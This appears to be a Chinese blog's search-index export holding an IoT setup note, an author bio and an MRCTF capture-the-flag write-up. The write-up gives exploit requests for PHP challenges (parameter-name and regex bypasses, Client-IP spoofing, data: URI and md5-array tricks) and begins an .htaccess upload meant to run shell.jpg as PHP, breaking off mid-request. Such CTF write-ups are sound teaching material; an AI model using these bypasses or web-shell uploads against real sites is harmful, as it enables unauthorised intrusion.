<li>设置<code>opkg</code>源,<code>/etc/opkg.conf</code>设置为如下内容，其中第五行，dest usb +SD卡的地址，也就是<code>/tmp/storage/soft</code></li>
</ul>
<pre><code class="shell">dest root /
dest ram /tmp
lists_dir ext /var/opkg-lists
option overlay_root /overlay

dest usb /tmp/storage/soft 

arch all 100
arch ramips_24kec 200
arch ramips 300
arch mips 400
arch unkown 500


src/gz barrier_breaker_base http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/base
src/gz barrier_breaker_luci http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/luci
src/gz barrier_breaker_management http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/management
src/gz barrier_breaker_oldpackages http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/oldpackages
src/gz barrier_breaker_packages http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/packages
src/gz barrier_breaker_routing http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/routing
src/gz barrier_breaker_telephony http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/telephony</code></pre>
<ul>
<li>安装过程</li>
</ul>
<pre><code class="shell">opkg update

wget http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/base/libc_0.9.33.2-1_ramips_24kec.ipk

opkg -d usb install libc_0.9.33.2-1_ramips_24kec.ipk

opkg -d usb install libreadline
opkg  -d usb install python
opkg -d usb install python-json
opkg -d usb install python-curl
opkg -d usb install python-openssl
</code></pre>
<ul>
<li>设置环境变量，也是加上python安装目录</li>
</ul>
<pre><code>export PATH=$PATH:/tmp/storage/soft/usr/bin </code></pre><ul>
<li>安装pip</li>
</ul>
<pre><code class="shell">wget --no-check-certificate https://bootstrap.pypa.io/get-pip.py  

python get-pip.py</code></pre>
]]></content>
      <categories>
        <category>IoT安全</category>
      </categories>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>关于我</title>
    <url>//articles/d3a8da2734.html</url>
    <content><![CDATA[<p>ID:Gq/xiaoleung</p>
<p>乌云ID:土豪</p>
<p>一名CS大学生退役士兵，主要学习web安全的小菜鸡。</p>
<p>热爱摄影，热爱户外，热爱编程和网络安全。</p>
<p>Email:admin#plasf.cn</p>
<p>WeChat:Q1BMQVhERg==</p>
]]></content>
      <categories>
        <category>AboutMe</category>
      </categories>
      <tags>
        <tag>自我介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF WP</title>
    <url>//articles/d3c5fc027b.html</url>
    <content><![CDATA[<h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><ul>
<li>index注释源码</li>
</ul>
<pre><code class="php">  $query = $_SERVER[&#39;QUERY_STRING&#39;];

   if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){
      die(&#39;Y0u are So cutE!&#39;);
  }
   if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;b_u_p_t&#39;])){
      echo &quot;you are going to the next ~&quot;;
  }</code></pre>
<ul>
<li><p>代码首先是对字符串的下划线进行统计，若大于0就直接die掉</p>
</li>
<li><p>而在下面需要接收一个叫b_u_p_t这个参数，而且它不能等于23333而正则匹配却要有23333这里有个小trick就是%0a可以绕过。而php参数，空格和点都会变成下划线_.</p>
</li>
<li><p>pyload</p>
</li>
</ul>
<pre><code>  http://ecf196f2-c27e-427a-aecc-31e4ee6a3a28.merak-ctf.site/?b.u.p.t=23333%0a</code></pre><ul>
<li><p>得到secrettw.php文件名</p>
</li>
<li><p>右键看源码存在一个jsfuck</p>
</li>
</ul>
<pre><code class="js">  &lt;!--
  [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])
  --&gt;</code></pre>
<ul>
<li>解密得</li>
</ul>
<pre><code>  post me Merak</code></pre><ul>
<li>POST Merak=1，得到源码</li>
</ul>
<pre><code class="php">  &lt;?php 
  error_reporting(0); 
  include &#39;takeip.php&#39;;
  ini_set(&#39;open_basedir&#39;,&#39;.&#39;); 
  include &#39;flag.php&#39;;

  if(isset($_POST[&#39;Merak&#39;])){ 
      highlight_file(__FILE__); 
      die(); 
  } 


  function change($v){ 
      $v = base64_decode($v); 
      $re = &#39;&#39;; 
      for($i=0;$i&lt;strlen($v);$i++){ 
          $re .= chr ( ord ($v[$i]) + $i*2 ); 
      } 
      return $re; 
  }
  echo &#39;Local access only!&#39;.&quot;&lt;br/&gt;&quot;;
  $ip = getIp();
  if($ip!=&#39;127.0.0.1&#39;)
  echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;
  if($ip === &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; ){
  echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);
  echo file_get_contents(change($_GET[&#39;file&#39;])); }
  ?&gt;  </code></pre>
<ul>
<li><p>绕过IP的方法<code>Client-IP: 127.0.0.1</code>,靶机没法访问外网，使用data协议去绕过file_get_contents.</p>
</li>
<li><p>而change的破解方法也就是把加号改成减号即可。</p>
</li>
</ul>
<pre><code class="php">
  function dechange($v){ 
      $re = &#39;&#39;; 
      for($i=0;$i&lt;strlen($v);$i++){ 
          $re .= chr ( ord ($v[$i]) - $i*2 ); 
      } 
      return base64_encode($re); 
  }</code></pre>
<ul>
<li><p>exp:</p>
<pre><code class="http">GET /secrettw.php?2333=data:text/html;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI= HTTP/1.1
Host: c5d4aa30-f6d3-44bf-a066-e2ece3b8c939.merak-ctf.site
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Client-IP: 127.0.0.1
</code></pre>
</li>
</ul>
<h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>XFF绕过</p>
<h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><ul>
<li><p>访问直接给源码</p>
<pre><code class="php">include &#39;flag.php&#39;;
$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;
if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) {
    $id=$_GET[&#39;id&#39;];
    $gg=$_GET[&#39;gg&#39;];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
        echo &#39;You got the first step&#39;;
        if(isset($_POST[&#39;passwd&#39;])) {
            $passwd=$_POST[&#39;passwd&#39;];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo &#39;Good Job!&#39;;
                     highlight_file(&#39;flag.php&#39;);
                     die(&#39;By Retr_0&#39;);
                 }
                 else
                 {
                     echo &quot;can you think twice??&quot;;
                 }
            }
            else{
                echo &#39;You can not get it !&#39;;
            }

        }
        else{
            die(&#39;only one way to get the flag&#39;);
        }
}
    else {
        echo &quot;You are not a real hacker!&quot;;
    }
}
else{
    die(&#39;Please input first&#39;);
}
}Please input first</code></pre>
<pre><code></code></pre></li>
<li><p>exp</p>
</li>
</ul>
<p>​```http<br>  POST /?id[]=1&amp;gg[]=2 HTTP/1.1<br>  Host: a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site<br>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0<br>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>  Accept-Encoding: gzip, deflate<br>  Content-Type: application/x-www-form-urlencoded<br>  Content-Length: 15<br>  Origin: <a href="http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site" target="_blank" rel="noopener">http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site</a><br>  Connection: close<br>  Referer: <a href="http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site/?id[]=1&amp;gg[]=2" target="_blank" rel="noopener">http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site/?id[]=1&amp;gg[]=2</a><br>  Upgrade-Insecure-Requests: 1<br>  X-Forwarded-For: 127.0.0.1</p>
<p>  passwd=1234567a</p>
<pre><code>
## 你传你🐎呢

- hatcess

```http
  POST /upload.php HTTP/1.1
  Host: b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Content-Type: multipart/form-data; boundary=---------------------------334048973639751065563777068351
  Content-Length: 434
  Origin: http://b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site
  Connection: close
  Referer: http://b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site/
  Cookie: PHPSESSID=042113335d44b84e0d7f11bd0059b8de
  Upgrade-Insecure-Requests: 1
  X-Forwarded-For: 127.0.0.1

  -----------------------------334048973639751065563777068351
  Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;
  Content-Type: image/jpeg

    &lt;FilesMatch &quot;shell.jpg&quot;&gt;
      SetHandler application/x-httpd-php
